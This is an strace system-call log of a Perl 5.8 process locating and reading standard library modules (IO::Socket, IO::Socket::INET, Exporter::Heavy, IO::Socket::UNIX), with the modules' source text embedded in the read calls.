12518 20:27:41.967543 _llseek(8, 5966, [5966], SEEK_SET) = 0
12518 20:27:41.967569 _llseek(8, 0, [5966], SEEK_CUR) = 0
12518 20:27:41.967580 close(8)          = 0
12518 20:27:41.968119 brk(0x827b000)    = 0x827b000
12518 20:27:41.968252 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12518 20:27:41.968788 _llseek(6, 6698, [6698], SEEK_SET) = 0
12518 20:27:41.968805 _llseek(6, 0, [6698], SEEK_CUR) = 0
12518 20:27:41.968815 close(6)          = 0
12518 20:27:41.968835 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968851 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968865 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968879 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968893 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968907 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968921 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968933 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968947 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968960 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968973 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.968987 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12518 20:27:41.969010 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.969026 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.969038 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.969055 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12518 20:27:41.969451 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969467 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969481 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969494 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969508 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969521 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969536 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969548 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969562 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969574 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969587 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969600 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969614 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.969750 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12518 20:27:41.969794 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.969837 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.969848 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.969865 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12518 20:27:41.970626 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12518 20:27:41.970870 brk(0x829c000)    = 0x829c000
12518 20:27:41.971116 read(8, "", 4096) = 0
12518 20:27:41.971131 close(8)          = 0
12518 20:27:41.972310 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12518 20:27:41.972678 _llseek(6, 6496, [6496], SEEK_SET) = 0
12518 20:27:41.972712 _llseek(6, 0, [6496], SEEK_CUR) = 0
12518 20:27:41.972737 close(6)          = 0
12518 20:27:41.972800 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972816 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972830 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972844 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972858 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972871 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972885 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972898 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972911 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972923 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972937 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.972951 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12518 20:27:41.972972 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.972987 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.972999 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.973014 brk(0x82bd000)    = 0x82bd000
12518 20:27:41.973031 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12518 20:27:41.973994 _llseek(6, 1386, [1386], SEEK_SET) = 0
12518 20:27:41.974011 _llseek(6, 0, [1386], SEEK_CUR) = 0
12518 20:27:41.974022 close(6)          = 0
12518 20:27:41.974076 stat64("/etc/perl/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974092 stat64("/etc/perl/IO/Dir.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974105 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974118 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974132 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974144 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974207 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974220 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974247 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974259 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.974272 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
